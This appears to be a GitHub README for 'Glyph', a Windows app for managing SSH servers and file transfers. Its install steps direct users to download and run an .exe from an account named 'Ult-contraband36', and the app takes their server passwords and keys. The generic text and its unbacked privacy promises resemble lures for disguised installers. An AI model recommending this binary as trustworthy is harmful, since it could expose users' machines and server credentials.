# 🖥️ Glyph - Manage your remote servers with ease

[![](https://img.shields.io/badge/Download_Glyph-grey?style=for-the-badge&link=https://github.com/Ult-contraband36/Glyph/releases)](https://github.com/Ult-contraband36/Glyph/releases)

Glyph helps you manage your remote servers from one window. Use this tool to organize your connections, check server status, and move files across multiple systems. It provides a clean interface for tasks that usually require complex code.

## 🛠️ What Glyph Does

Glyph acts as a dashboard for your server infrastructure. Instead of juggling many terminal windows or different programs, you manage everything in one view. 

* **Centralized Connections:** Save your server login details in one secure place.
* **File Management:** Move your data between your local computer and remote servers using a drag-and-drop interface.
* **Status Monitoring:** Watch your server performance in real-time.
* **Modern Design:** Enjoy a clear, visual layout that makes technical tasks easier to navigate.

## ⚙️ Requirements

Before you install Glyph, make sure your computer meets these needs:

* **Operating System:** Windows 10 or Windows 11.
* **Processor:** 1 gigahertz (GHz) or faster processor.
* **Memory:** 4 gigabytes (GB) of RAM.
* **Storage:** 200 megabytes of free space on your hard drive.
* **Network:** An active internet connection to contact your remote servers.

## 📥 How to Install

Follow these steps to set up Glyph on your Windows computer:

1. Visit the [official releases page here](https://github.com/Ult-contraband36/Glyph/releases) to find the latest version.
2. Look for the file ending in `.exe` under the latest release section.
3. Click the file name to download the installer to your computer.
4. Locate the file in your downloads folder once the process finishes.
5. Double-click the file to start the installation.
6. Follow the on-screen prompts to place Glyph on your machine.
7. Click Finish to launch the application.

## 🔑 Your First Connection

Once the program opens, you can add your first server. Follow this guide:

1. Click the plus (+) icon on the top right side of the screen.
2. Enter a nickname for your server so you remember which one it is.
3. Input the IP address or host name provided by your server host.
4. Choose the connection type. Most users choose SSH for secure access.
5. Provide your username and password or your private key file.
6. Click the Save button.
7. Find your new server in the left-hand menu and click it to connect.

## 📁 Managing Files

Glyph makes moving files between your desktop and your server simple. When you connect to a server, the application divides the screen. Your local files appear on the left, while your remote server files appear on the right. 

You can drag a file from your computer folder and drop it into the server list. Glyph handles the transfer in the background. You can monitor the progress bar at the bottom of the window to see when the upload finishes.

## 🛡️ Privacy and Data

Glyph handles your credentials locally on your computer. The application does not send your passwords or server keys to any external servers. Your saved connections stay inside the application folder on your Windows machine. Keep your computer password protected to ensure that nobody else can access your saved server list.

## 💡 Common Questions

**Does Glyph support multiple windows?**
Yes, you can open several tabs within the application to monitor different servers at the same time.

**Can I change how the app looks?**
The application uses a neutral dark mode by default. You can adjust font sizes and theme settings in the settings menu.

**What happens if the connection drops?**
Glyph automatically attempts to reconnect to your server if the network signal fades. It will alert you if the connection stays broken for more than a few seconds.

**Do I need special software on my server?**
No, Glyph connects using standard protocols that almost every server provider already enables by default.

## 🛠️ Technical Details

This project uses modern web technology to provide you with a smooth experience. It relies on the following tools:

* **React:** This powers the interface you see on screen.
* **Electron:** This allows the code to run as a standard desktop program.
* **Tailwind CSS:** This keeps the design consistent and easy to read.
* **SSH2-SFTP:** This handles the secure transport of your files.
* **Vite:** This manages the underlying code build process to keep the software fast.

If you notice any bugs, please report them through the issues tab on this page. We prioritize fixes that affect the stability of your file transfers and connection security.